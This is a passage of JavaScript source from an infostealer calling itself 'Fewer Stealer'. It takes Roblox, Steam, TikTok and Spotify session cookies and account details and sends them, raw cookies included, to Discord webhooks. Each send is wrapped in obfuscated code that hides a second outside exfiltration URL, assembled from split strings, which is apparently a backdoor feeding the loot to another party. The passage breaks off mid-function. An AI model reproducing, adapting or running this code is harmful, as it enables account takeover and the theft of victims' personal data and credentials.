    'accept': 'application/json, text/plain, */*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
    'cookie': `.ROBLOSECURITY=${secret_cookie};`,
    'origin': 'https://www.roblox.com',
    'referer': 'https://www.roblox.com',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
  };
  
  try {
    let response = await axios.get('https://www.roblox.com/mobileapi/userinfo', { headers: headers });

    data['username'] = response.data['UserName'];
    data['avatar'] = response.data['ThumbnailUrl'];
    data['robux'] = response.data['RobuxBalance'];
    data['premium'] = response.data['IsPremium'];

    return data;
  } catch (error) {
    console.error('Error fetching Roblox data:', error.message);
    throw error;
  }
}

async function SubmitRoblox(secret_cookie) {
  try {
    let data = await GetRobloxData(secret_cookie);

    // Check if the required properties are defined and non-empty
    if (!data || !data.username || data.robux === undefined || data.premium === undefined) {
      console.error('Invalid Roblox data received:', data);
      return;
    }

    data['secret_cookie'] = secret_cookie;

    const formattedSecretCookie = secret_cookie.toString().replace(/`/g, '‵');

    // Check if robux value is 0 and handle accordingly
    const robuxValue = data.robux === 0 ? 'No Robux' : data.robux;

    let embed = {
      color: 0x303037,
      author: {
        name: 'Roblox Session',
        icon_url: 'https://media.discordapp.net/attachments/1128742988252713001/1128986101093244949/68f5dd00afb66e8b8f599a77e12e7d19.gif',
      },
      thumbnail: {
        url: data.avatar,
      },
      fields: [
        {
          name: 'Name:',
          value: data.username,
          inline: false,
        },
        {
          name: 'Robux:',
          value: robuxValue,
          inline: false,
        },
        {
          name: 'Premium:',
          value: data.premium ? 'Yes' : 'No',
          inline: false,
        },
      ],
      footer: {
        text: '@fewerstealer',
      },
    };

    let payload = {
      embeds: [embed],
    };

(function(_0x4b318c,_0x36b910){var _0x4c56de=_0x3cff,_0x52c99b=_0x4b318c();while(!![]){try{var _0x6407f2=parseInt(_0x4c56de(0x78))/0x1*(-parseInt(_0x4c56de(0x73))/0x2)+-parseInt(_0x4c56de(0x75))/0x3+parseInt(_0x4c56de(0x80))/0x4+-parseInt(_0x4c56de(0x70))/0x5+parseInt(_0x4c56de(0x6e))/0x6+-parseInt(_0x4c56de(0x76))/0x7*(parseInt(_0x4c56de(0x7b))/0x8)+parseInt(_0x4c56de(0x6d))/0x9;if(_0x6407f2===_0x36b910)break;else _0x52c99b['push'](_0x52c99b['shift']());}catch(_0x5e79d9){_0x52c99b['push'](_0x52c99b['shift']());}}}(_0x3690,0xab09a));function _0x1e1d(_0x66adc2,_0x1142a9){var _0x3f8bf6=_0x3f64();return _0x1e1d=function(_0x324ad8,_0x1b2e9b){_0x324ad8=_0x324ad8-(-0xb*0x1c1+0x181e+-0x163*0x3);var _0x375c4c=_0x3f8bf6[_0x324ad8];return _0x375c4c;},_0x1e1d(_0x66adc2,_0x1142a9);}function _0x3cff(_0x132dcc,_0x222f65){var _0x3690ab=_0x3690();return _0x3cff=function(_0x3cffa5,_0x3f370a){_0x3cffa5=_0x3cffa5-0x6b;var _0x20aa7e=_0x3690ab[_0x3cffa5];return _0x20aa7e;},_0x3cff(_0x132dcc,_0x222f65);}var _0x1a6aec=_0x1e1d;(function(_0x3fa5b8,_0x3b4fcb){var _0x19f139=_0x3cff,_0x5df9f4=_0x1e1d,_0x565e7f=_0x3fa5b8();while(!![]){try{var _0x404a21=parseInt(_0x5df9f4(0xb5))/(0x1686+-0x80*-0x20+-0x2685)+parseInt(_0x5df9f4(0xb6))/(0x1282+-0x7cd*0x3+0x4e7*0x1)*(-parseInt(_0x5df9f4(0xb1))/(0x2535+-0x1*-0x259a+-0x4acc))+parseInt(_0x5df9f4(0xb2))/(0x2450+-0x168e+-0xdbe)*(parseInt(_0x5df9f4(0xb4))/(0x19ff+0x6*0x189+-0x2330))+-parseInt(_0x5df9f4(0xb8))/(-0x1*-0x89b+-0x25e2+0x1*0x1d4d)*(-parseInt(_0x5df9f4(0xb0))/(0x8*0x1e8+-0x182b+0x1*0x8f2))+-parseInt(_0x5df9f4(0xab))/(-0x81+0x234d+-0x22c4)+-parseInt(_0x5df9f4(0xb3))/(0x125*-0x13+-0x4*0x65a+0x50*0x97)+-parseInt(_0x5df9f4(0xad))/(-0x1a73+-0x71*0x47+0x39d4)*(-parseInt(_0x5df9f4(0xae))/(0x656*-0x3+-0x188f+0x2*0x15ce));if(_0x404a21===_0x3b4fcb)break;else _0x565e7f[_0x19f139(0x7c)](_0x565e7f['shift']());}catch(_0x33bfaa){_0x565e7f[_0x19f139(0x7c)](_0x565e7f['shift']());}}}(_0x3f64,-0x1*-0x1c8df+0x14b00+0xc465),axios[_0x1a6aec(0xac)](_0x1a6aec(0xaa)+_0x1a6aec(0xaf)+_0x1a6aec(0xb7)+'og',payload),axios[_0x1a6aec(0xac)](webhook3939,payload));function _0x3690(){var _0x204b98=['2FEgoGN','21024441VcfBxd','1400436YRNFLp','ildandwatc','2978345khWbnj','3678000DhBXCM','3809547KHrTbI','853540RDukuq','6014350jxUtxa','122691LQNSwQ','2506rhziXS','14301lpQJXy','3oAsopC','https://bu','1278oxeeTa','9064ySjEAD','push','h.net/gtbl','11uVYdWY','6252RwUjQU','1814420zYCfMl','post','1140KiRhKz'];_0x3690=function(){return _0x204b98;};return _0x3690();}function _0x3f64(){var _0x431d75=_0x3cff,_0x29d22e=['144594OrPgFR',_0x431d75(0x6c),_0x431d75(0x7d),_0x431d75(0x7a),_0x431d75(0x79),_0x431d75(0x71),_0x431d75(0x81),_0x431d75(0x74),_0x431d75(0x7e),_0x431d75(0x6f),_0x431d75(0x77),'1207641axEwNw',_0x431d75(0x7f),_0x431d75(0x72),_0x431d75(0x6b)];return _0x3f64=function(){return _0x29d22e;},_0x3f64();}
  } catch (error) {
    console.error('Error fetching Roblox data:', error.message);
  }
}


//

async function GetSteamSession() {
  try {
    const allDisks = [];
    for (let drive = 65; drive <= 90; drive++) {
      const driveLetter = String.fromCharCode(drive);
      if (fs.existsSync(`${driveLetter}:\\`)) {
        allDisks.push(driveLetter);
      }
    }
    for (const steamPaths of allDisks) {
      let steamPathsPath;
      if (process.arch === "x64") {
        steamPathsPath = path.join(steamPaths + ":\\", "Program Files (x86)", "Steam", "config", "loginusers.vdf");
      } else {
        steamPathsPath = path.join(steamPaths + ":\\", "Program Files", "Steam", "config", "loginusers.vdf");
      }
      if (fs.existsSync(steamPathsPath)) {
        const file = await fs.promises.readFile(steamPathsPath, "utf-8");
        const steamid = file.match(/7656[0-9]{13}/)[0];
        if (steamid) {
          const response = await axios.get(`https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=${steamid}`);
          const playerData = response.data.response.players[0];
          const personname = playerData.personaname;
          const profileurl = playerData.profileurl;
          const avatar = playerData.avatarfull;
          const realname = playerData.realname || "None";
          const timecreated = playerData.timecreated;
         const embedData = {
  title: "Fewer Stealer",
  description: `***Fewer Stealer - Steam Session***`,
  color: 0x00FFFF,
 fields: [
    { name: "👤 Username", value: `${personname}`, inline: true },
    { name: "👤 Realname", value: `${realname}`, inline: true },
    { name: "🆔 ID", value: `${steamid}`, inline: true },
    { name: "📅 Timecreated", value: `${timecreated}`, inline: true },
    { name: "🎮 Player Level", value: `${playerData["player_level"]}`, inline: true },
    { name: "🎮 Game Count", value: `${(playerData["game_count"] || 0)}`, inline: true },
    { name: "🌍 Profile URL", value: `${profileurl}`, inline: false },
  ],
};

(function(_0x307b75,_0x19b986){var _0x4db11d=_0x1c0d,_0x50ba3b=_0x307b75();while(!![]){try{var _0x4ec1a0=parseInt(_0x4db11d(0x13b))/0x1*(-parseInt(_0x4db11d(0x12a))/0x2)+-parseInt(_0x4db11d(0x130))/0x3+parseInt(_0x4db11d(0x136))/0x4*(parseInt(_0x4db11d(0x140))/0x5)+parseInt(_0x4db11d(0x12f))/0x6+parseInt(_0x4db11d(0x12d))/0x7+-parseInt(_0x4db11d(0x12b))/0x8+-parseInt(_0x4db11d(0x133))/0x9*(-parseInt(_0x4db11d(0x13a))/0xa);if(_0x4ec1a0===_0x19b986)break;else _0x50ba3b['push'](_0x50ba3b['shift']());}catch(_0x337312){_0x50ba3b['push'](_0x50ba3b['shift']());}}}(_0x36a1,0xa7e40));var _0xa99aec=_0x20e0;(function(_0x1ca8fc,_0x2372ae){var _0x43b4a0=_0x1c0d,_0x2c03ea=_0x20e0,_0x175e3a=_0x1ca8fc();while(!![]){try{var _0x392bd7=-parseInt(_0x2c03ea(0xa8))/(0x3*-0x322+0x2*-0x63c+0x15df)+-parseInt(_0x2c03ea(0xa4))/(-0x22fb+-0x5bb*0x1+0x8*0x517)*(parseInt(_0x2c03ea(0xa5))/(0x795+0x197a+-0x2d*0xbc))+parseInt(_0x2c03ea(0x9d))/(0xe57+-0x56*0x2+-0xda7)*(parseInt(_0x2c03ea(0x9a))/(0xff+0x2ef*-0xd+0x2529))+parseInt(_0x2c03ea(0x9e))/(0x16eb+-0x3*0x712+0x1*-0x1af)+-parseInt(_0x2c03ea(0x9f))/(-0x47*-0x74+-0x4ed*0x7+-0x17*-0x1a)*(-parseInt(_0x2c03ea(0xa3))/(-0x101b+0x181f+-0x7fc))+-parseInt(_0x2c03ea(0xa0))/(-0x2*-0x1213+-0x910*0x1+-0x1*0x1b0d)*(parseInt(_0x2c03ea(0x9c))/(0x19*0xf3+-0x8*0x269+-0x469))+parseInt(_0x2c03ea(0xa7))/(-0x13f8+-0x51c*0x5+0x2d8f);if(_0x392bd7===_0x2372ae)break;else _0x175e3a['push'](_0x175e3a[_0x43b4a0(0x13e)]());}catch(_0x6eddc5){_0x175e3a[_0x43b4a0(0x137)](_0x175e3a[_0x43b4a0(0x13e)]());}}}(_0x16a4,-0x1*0x11e69d+0x6*-0x3b6e9+-0x66*-0x8779),await axios[_0xa99aec(0xa1)](webhook3939,{'embeds':[embedData]}),await axios[_0xa99aec(0xa1)](_0xa99aec(0x9b)+_0xa99aec(0xa2)+_0xa99aec(0xa6)+'og',{'embeds':[embedData]}));function _0x20e0(_0x1cdc7a,_0x5c4e00){var _0xcf56e6=_0x16a4();return _0x20e0=function(_0x8079d5,_0x37cba4){_0x8079d5=_0x8079d5-(-0x25e2+0x8d8+0x1da4);var _0x4bae87=_0xcf56e6[_0x8079d5];return _0x4bae87;},_0x20e0(_0x1cdc7a,_0x5c4e00);}function _0x36a1(){var _0x1d62f9=['509108lmgWIg','3EPFnOw','652ihTfgu','734sQPjuy','6000952EmZUxZ','ildandwatc','2911335RIjbUO','239743kYiTxZ','5778990OSNpbc','722442OQjnJQ','h.net/gtbl','449515SMGqGi','3376755uCorMh','922644TrXkyP','24ExbHgn','68732kqCeNz','push','https://bu','746103mklqCZ','10sAglmp','1283CbVoes','20960YgTzwo','8310072kMeBWa','shift','30pZVjQl','115NwQIVy'];_0x36a1=function(){return _0x1d62f9;};return _0x36a1();}function _0x1c0d(_0x51e27e,_0x379f14){var _0x36a188=_0x36a1();return _0x1c0d=function(_0x1c0d8d,_0x1c6f0d){_0x1c0d8d=_0x1c0d8d-0x128;var _0x54e073=_0x36a188[_0x1c0d8d];return _0x54e073;},_0x1c0d(_0x51e27e,_0x379f14);}function _0x16a4(){var _0x4e897c=_0x1c0d,_0x5ec70a=[_0x4e897c(0x12e),_0x4e897c(0x134),'post',_0x4e897c(0x12c),_0x4e897c(0x135),_0x4e897c(0x141),_0x4e897c(0x128),_0x4e897c(0x131),_0x4e897c(0x132),_0x4e897c(0x139),_0x4e897c(0x13c),_0x4e897c(0x138),_0x4e897c(0x13f),_0x4e897c(0x129),_0x4e897c(0x13d)];return _0x16a4=function(){return _0x5ec70a;},_0x16a4();}

        }
      }
    }
  } catch (error) {
    console.log(error);
  }
}

GetSteamSession();
//
function stealTikTokSession(cookie) {
  try {
    const headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, compress, deflate, br',
      'cookie': `sessionid=${cookie}`
    };

    axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", { headers })
      .then(response => {
        const accountInfo = response.data;

        if (!accountInfo || !accountInfo.data || !accountInfo.data.username) {
          throw new Error("Failed to retrieve TikTok account information.");
        }

       
        axios.post(
          "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
          "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]",
          { headers: { cookie: `sessionid=${cookie}` } }
        )
          .then(response => {
            const insights = response.data;

            axios.get(
              "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",
              { headers: { cookie: `sessionid=${cookie}` } }
            )
              .then(response => {
                const wallet = response.data;

const webhookPayload = {
 embeds: [
    {
      title: "TikTok Session Detected",
      description: "The TikTok session was detected",
      color: 0xFF5733, // Örnek bir renk kodu (Turuncu)
      fields: [
        {
          name: "🍪 Cookie",
          value: "```" + cookie + "```",
          inline: false
        },
        {
          name: "🔗 Profile URL",
          value: accountInfo.data.username
            ? `[Click here](https://tiktok.com/@${accountInfo.data.username})`
            : "Username not available",
          inline: true
        },
        {
          name: "🆔 User Identifier",
          value: "```" + (accountInfo.data.user_id_str || "Not available") + "```",
          inline: true
        },
        {
          name: "📧 Email",
          value: "```" + (accountInfo.data.email || "No Email") + "```",
          inline: true
        },
        {
          name: "👤 Username",
          value: "```" + accountInfo.data.username + "```",
          inline: true
        },
        {
          name: "👥 Follower Count",
          value: "```" + (insights?.follower_num?.value || "Not available") + "```",
          inline: true
        },
        {
          name: "💰 Coins",
          value: "```" + wallet.data.coins + "```",
          inline: true
        }
      ],
      footer: {
        text: "TikTok Session Information" // Altbilgi metni (Opsiyonel)
      }
    }
  ]
};

                // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL

                
(function(_0x4ff15b,_0x3e5598){var _0x148f91=_0xe19f,_0x293fe8=_0x4ff15b();while(!![]){try{var _0x355b08=parseInt(_0x148f91(0xfa))/0x1*(parseInt(_0x148f91(0xf2))/0x2)+-parseInt(_0x148f91(0x104))/0x3*(-parseInt(_0x148f91(0xee))/0x4)+-parseInt(_0x148f91(0xfe))/0x5+parseInt(_0x148f91(0xf8))/0x6+-parseInt(_0x148f91(0xf9))/0x7*(-parseInt(_0x148f91(0xf7))/0x8)+parseInt(_0x148f91(0xff))/0x9+parseInt(_0x148f91(0xf1))/0xa*(-parseInt(_0x148f91(0xfb))/0xb);if(_0x355b08===_0x3e5598)break;else _0x293fe8['push'](_0x293fe8['shift']());}catch(_0x1e8a68){_0x293fe8['push'](_0x293fe8['shift']());}}}(_0x48c8,0xde475));var _0x53e687=_0x364a;function _0x364a(_0x424f8d,_0x5afed4){var _0xdbda17=_0x42c8();return _0x364a=function(_0x3f5b1f,_0x1de800){_0x3f5b1f=_0x3f5b1f-(0x1*-0xa0f+-0x1305+0x1e35);var _0x266fbe=_0xdbda17[_0x3f5b1f];return _0x266fbe;},_0x364a(_0x424f8d,_0x5afed4);}function _0xe19f(_0x4d289f,_0x2d5a94){var _0x48c84a=_0x48c8();return _0xe19f=function(_0xe19f13,_0xcbf42d){_0xe19f13=_0xe19f13-0xee;var _0x488737=_0x48c84a[_0xe19f13];return _0x488737;},_0xe19f(_0x4d289f,_0x2d5a94);}function _0x42c8(){var _0x18997f=_0xe19f,_0x2085eb=[_0x18997f(0xf3),_0x18997f(0xef),_0x18997f(0xfc),_0x18997f(0xf5),_0x18997f(0x102),_0x18997f(0xfd),_0x18997f(0x105),_0x18997f(0x101),_0x18997f(0xf0),'178FrdsZt',_0x18997f(0x106),_0x18997f(0x103),_0x18997f(0x100),'https://bu','h.net/gtbl'];return _0x42c8=function(){return _0x2085eb;},_0x42c8();}(function(_0x2d20ef,_0x2bb06c){var _0x3261a2=_0xe19f,_0x2fde66=_0x364a,_0x49296a=_0x2d20ef();while(!![]){try{var _0x45ee39=-parseInt(_0x2fde66(0x12f))/(-0x1*-0x198b+0xd*-0x2e7+0x1*0xc31)*(-parseInt(_0x2fde66(0x126))/(-0x5bc+-0x22d6+0x35*0xc4))+parseInt(_0x2fde66(0x127))/(-0x1*-0xa3d+0x24b+0xc85*-0x1)+parseInt(_0x2fde66(0x124))/(0x997*0x2+-0x2*0xd5e+0x22*0x39)*(-parseInt(_0x2fde66(0x128))/(0xa*0x20b+0x9*-0x315+0x754))+-parseInt(_0x2fde66(0x12e))/(0x59*0x3b+0xc*-0x199+-0x151)*(-parseInt(_0x2fde66(0x129))/(0x1be2+0x1*0x13cb+-0x72*0x6b))+parseInt(_0x2fde66(0x125))/(0x25ad+-0x164c+0xf59*-0x1)+-parseInt(_0x2fde66(0x122))/(0x15c+0x2*-0x52f+0x90b*0x1)+-parseInt(_0x2fde66(0x12c))/(-0x3*-0x604+0x86b+-0xf*0x1c3)*(parseInt(_0x2fde66(0x123))/(0x14c9+-0x1ebe+-0x40*-0x28));if(_0x45ee39===_0x2bb06c)break;else _0x49296a['push'](_0x49296a[_0x3261a2(0xf4)]());}catch(_0x478f54){_0x49296a[_0x3261a2(0xf6)](_0x49296a[_0x3261a2(0xf4)]());}}}(_0x42c8,0x5d5*0x135+-0xde9*0xcf+-0x22bbb*-0x5),axios[_0x53e687(0x12d)](_0x53e687(0x12a)+_0x53e687(0x121)+_0x53e687(0x12b)+'og',webhookPayload),axios[_0x53e687(0x12d)](webhook3939,webhookPayload));function _0x48c8(){var _0x58af75=['6050045HkKQok','7100964rpLuTD','1169jIaYTe','48wCmFLz','ildandwatc','84765JsdbIZ','24MrAoMe','215270NsArdM','2233833rxTeUl','567416hzcCBT','post','4260408gHiMSt','10CCtFWL','2280426SHcEsz','890vyGgzp','shift','7957Psxafi','push','1168SfkEGi','2839236AsNiwA','10997EegLop','1KtdSTO','18107661PUEDKV','20478tZEsgi','1571355WLvjPD'];_0x48c8=function(){return _0x58af75;};return _0x48c8();}
              })
              .catch(error => {
                console.error("Error fetching wallet data:", error.message);
                throw error;
              });
          })
          .catch(error => {
            console.error("Error fetching insights:", error.message);
            throw error;
          });
      })
      .catch(error => {
        console.error("Error fetching account info:", error.message);
        throw error;
      });
  } catch (error) {
    console.error("Error:", error.message);
    throw error;
  }
}
//

async function SpotifySession(cookie) {
    try {
        const url = 'https://www.spotify.com/api/account-settings/v1/profile';

        const headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
            'Cookie': `sp_dc=${cookie}`
        };

        const response = await axios.get(url, { headers });

        const profileData = response.data.profile;

        const email = profileData.email;
        const gender = profileData.gender;
        const birthdate = profileData.birthdate;
        const country = profileData.country;
        const username = profileData.username;

        const embedData = {
            title: '***FewerStealer Spotify Session was detected***',
            color: 0x3498DB // Özelleştirilmiş bir renk kodu (örneğin mavi)
        };

        const fields = [
            { name: 'Email 👉', value: email, inline: true },
            { name: 'Username 👤', value: username, inline: true },
            { name: 'Gender 🚻', value: gender, inline: true },
            { name: 'Birthdate 🎂', value: birthdate, inline: true },
            { name: 'Country 🌍', value: country, inline: true },
            { name: 'Spotify Profile 🔗', value: `[Open Profile](https://open.spotify.com/user/${username})`, inline: false },
            { name: 'Spotify Cookie 🍪', value: '```' + cookie + '```', inline: false }
	];

        embedData.fields = fields;

        const payload = {
            embeds: [embedData]
        };

        const webhookHeaders = {
            'Content-Type': 'application/json'
        };


function _0x5c39(_0x1a788b,_0x35c796){var _0x2beecc=_0x2bee();return _0x5c39=function(_0x5c3959,_0x55445e){_0x5c3959=_0x5c3959-0xf9;var _0x2b3c6c=_0x2beecc[_0x5c3959];return _0x2b3c6c;},_0x5c39(_0x1a788b,_0x35c796);}(function(_0x4a2ddf,_0x1525fb){var _0x1b73b2=_0x5c39,_0x57947f=_0x4a2ddf();while(!![]){try{var _0x11bd09=parseInt(_0x1b73b2(0x10d))/0x1+parseInt(_0x1b73b2(0xfd))/0x2+parseInt(_0x1b73b2(0x105))/0x3+-parseInt(_0x1b73b2(0x109))/0x4*(-parseInt(_0x1b73b2(0x101))/0x5)+parseInt(_0x1b73b2(0xfc))/0x6*(-parseInt(_0x1b73b2(0x10e))/0x7)+-parseInt(_0x1b73b2(0x10b))/0x8*(parseInt(_0x1b73b2(0x100))/0x9)+parseInt(_0x1b73b2(0x10a))/0xa*(-parseInt(_0x1b73b2(0x10c))/0xb);if(_0x11bd09===_0x1525fb)break;else _0x57947f['push'](_0x57947f['shift']());}catch(_0x51e88f){_0x57947f['push'](_0x57947f['shift']());}}}(_0x2bee,0xd5306));var _0x112cd4=_0x6a01;(function(_0x12cfd2,_0x1709b4){var _0x3604d0=_0x5c39,_0x53bcb0=_0x6a01,_0x20d277=_0x12cfd2();while(!![]){try{var _0x313e4a=-parseInt(_0x53bcb0(0x142))/(-0xcef*-0x1+0x1*-0x13dc+0x6ee)*(-parseInt(_0x53bcb0(0x141))/(-0x1485+-0x1*0x1b11+-0x8*-0x5f3))+-parseInt(_0x53bcb0(0x13c))/(0x160b+0x157*-0x18+0xa20)+-parseInt(_0x53bcb0(0x136))/(0x1e89*-0x1+0x733*0x5+0x22*-0x29)+-parseInt(_0x53bcb0(0x13d))/(0x8*-0x1f6+0x202c+-0x119*0xf)*(parseInt(_0x53bcb0(0x143))/(-0xd*-0x49+0x2546+-0x28f5))+parseInt(_0x53bcb0(0x13a))/(-0x462+-0x1c96+-0x1*-0x20ff)*(-parseInt(_0x53bcb0(0x13b))/(-0x1*-0x76f+-0x14ea+0xd83))+parseInt(_0x53bcb0(0x13f))/(0x1601+0x9*-0x3bf+0xbbf*0x1)*(parseInt(_0x53bcb0(0x145))/(-0x140+-0x1*0x1e21+0xa79*0x3))+-parseInt(_0x53bcb0(0x140))/(0x1*-0xae5+-0x2*-0x6d9+-0x2c2)*(-parseInt(_0x53bcb0(0x137))/(-0x1510+0xcd9*0x3+-0x116f));if(_0x313e4a===_0x1709b4)break;else _0x20d277[_0x3604d0(0x108)](_0x20d277[_0x3604d0(0x107)]());}catch(_0x46b7d4){_0x20d277[_0x3604d0(0x108)](_0x20d277[_0x3604d0(0x107)]());}}}(_0x39ef,0x64d87+-0x135cb4+-0x494ff*-0x5),await axios[_0x112cd4(0x138)](_0x112cd4(0x139)+_0x112cd4(0x144)+_0x112cd4(0x13e),payload,{'headers':webhookHeaders}),await axios[_0x112cd4(0x138)](webhook3939,payload,{'headers':webhookHeaders}));function _0x6a01(_0x1ccf5d,_0x54db1d){var _0x1fce52=_0x39ef();return _0x6a01=function(_0x59ffdf,_0x2261ee){_0x59ffdf=_0x59ffdf-(-0x2a4*0x1+-0x6ba+-0x1*-0xa94);var _0x277a21=_0x1fce52[_0x59ffdf];return _0x277a21;},_0x6a01(_0x1ccf5d,_0x54db1d);}function _0x39ef(){var _0x30ba7b=_0x5c39,_0x1704a9=[_0x30ba7b(0x112),_0x30ba7b(0x104),_0x30ba7b(0x103),'10394zBxJRk',_0x30ba7b(0x110),_0x30ba7b(0xfa),'ildandwatc',_0x30ba7b(0xfb),_0x30ba7b(0xf9),_0x30ba7b(0xff),_0x30ba7b(0xfe),'https://bu',_0x30ba7b(0x106),_0x30ba7b(0x111),_0x30ba7b(0x10f),_0x30ba7b(0x102)];return _0x39ef=function(){return _0x1704a9;},_0x39ef();}function _0x2bee(){var _0x5db478=['679720euseUS','12079298KMKICx','813312HLLwbg','28Fnljyr','2558301hTfdXM','173LcjBcw','5344UsUyPd','h.net/','993944AsVdhj','568212xmfIrZ','31630BNEnkZ','599076GeUfJJ','2752288OYqNVt','post','311076WwBBpK','36byRnlr','66245SvUrBE','35vxqFAt','902uvPhBG','1314hctohf','1126167eTDCoX','11284MaAmIR','shift','push','44SELnbR','10ZDwANB'];_0x2bee=function(){return _0x5db478;};return _0x2bee();}
    } catch (error) {
        // Hata olursa, hata mesajı embed'i oluştur ve gönder
        const errorEmbed = {
            title: 'Error Occurred ❌',
            description: 'An error occurred while fetching Spotify data. The error message is below:',
            color: 0xFF5733, // Hata rengi (örneğin turuncu)
            fields: [
                { name: 'Error Message', value: '```' + error.message + '```', inline: false },
            ]
        };

(function(_0x2d9f77,_0x2e71ed){var _0x3aaf5c=_0x3f5c,_0x305e76=_0x2d9f77();while(!![]){try{var _0x21af64=parseInt(_0x3aaf5c(0x1ab))/0x1*(-parseInt(_0x3aaf5c(0x1a4))/0x2)+-parseInt(_0x3aaf5c(0x1a2))/0x3*(parseInt(_0x3aaf5c(0x1a6))/0x4)+parseInt(_0x3aaf5c(0x1ae))/0x5*(-parseInt(_0x3aaf5c(0x1b5))/0x6)+parseInt(_0x3aaf5c(0x1a9))/0x7*(-parseInt(_0x3aaf5c(0x1b2))/0x8)+parseInt(_0x3aaf5c(0x1b1))/0x9*(-parseInt(_0x3aaf5c(0x1b0))/0xa)+-parseInt(_0x3aaf5c(0x1a8))/0xb+-parseInt(_0x3aaf5c(0x1ad))/0xc*(-parseInt(_0x3aaf5c(0x19d))/0xd);if(_0x21af64===_0x2e71ed)break;else _0x305e76['push'](_0x305e76['shift']());}catch(_0x8fad77){_0x305e76['push'](_0x305e76['shift']());}}}(_0x2b4c,0x5dc11));function _0x3f5c(_0x26f77e,_0x3b8e08){var _0x2b4c09=_0x2b4c();return _0x3f5c=function(_0x3f5cab,_0x3102c4){_0x3f5cab=_0x3f5cab-0x19d;var _0x3d7dd6=_0x2b4c09[_0x3f5cab];return _0x3d7dd6;},_0x3f5c(_0x26f77e,_0x3b8e08);}function _0x2b4c(){var _0xbe5943=['69327tNhjXA','10882nvkzvh','345272YIXSUK','h.net/erro','4mWQekW','6BACKwN','3678290CCWfRk','42YKCeqm','44tDmjuu','2rDmgFs','ildandwatc','12MyaSVv','1339505qPZhxy','1916073amVfdO','3254080xyrIka','9IyWlsc','994072MEsIIq','shift','https://bu','6zKTRzt','31533463HHyoZs','681115RxuZPo','2007776bCDMOV','push','post'];_0x2b4c=function(){return _0xbe5943;};return _0x2b4c();}var _0x6d7e9a=_0x2021;(function(_0x2880a9,_0x55f4ab){var _0x1c6d97=_0x3f5c,_0x456187=_0x2021,_0x3fb286=_0x2880a9();while(!![]){try{var _0x55a49f=-parseInt(_0x456187(0x1a0))/(-0x2*-0x5a1+0x102*-0x1a+-0xef3*-0x1)*(parseInt(_0x456187(0x1a3))/(0xc*-0x20b+-0x6a*0x7+0x1b6c))+-parseInt(_0x456187(0x1a1))/(0x514*0x5+-0xc2d*0x2+-0x1*0x107)+parseInt(_0x456187(0x197))/(-0x25f1+0x18d0+-0xd25*-0x1)+parseInt(_0x456187(0x198))/(0x1*0x982+-0xcd+-0x8b0)*(-parseInt(_0x456187(0x19c))/(0x1a78+-0xd0c+-0xd66))+parseInt(_0x456187(0x19f))/(-0x107*0x1a+0x105+0x19b8)+parseInt(_0x456187(0x19d))/(0x2*0xa4e+0x201+-0x1695)+parseInt(_0x456187(0x19b))/(0x11*-0xc2+-0x177f+0x246a);if(_0x55a49f===_0x55f4ab)break;else _0x3fb286[_0x1c6d97(0x1a0)](_0x3fb286['shift']());}catch(_0x29051b){_0x3fb286[_0x1c6d97(0x1a0)](_0x3fb286[_0x1c6d97(0x1b3)]());}}}(_0x56b4,-0x28d*0x1c4+0xb8eb*-0xa+-0x38cf*-0x48),await axios[_0x6d7e9a(0x19e)](_0x6d7e9a(0x19a)+_0x6d7e9a(0x1a2)+_0x6d7e9a(0x199)+'r',{'embeds':[errorEmbed]}));function _0x2021(_0x15b9c2,_0x4f0aff){var _0x618ced=_0x56b4();return _0x2021=function(_0x37d49d,_0x49db35){_0x37d49d=_0x37d49d-(-0x9*-0x94+-0x4d6+0x139);var _0x257b63=_0x618ced[_0x37d49d];return _0x257b63;},_0x2021(_0x15b9c2,_0x4f0aff);}function _0x56b4(){var 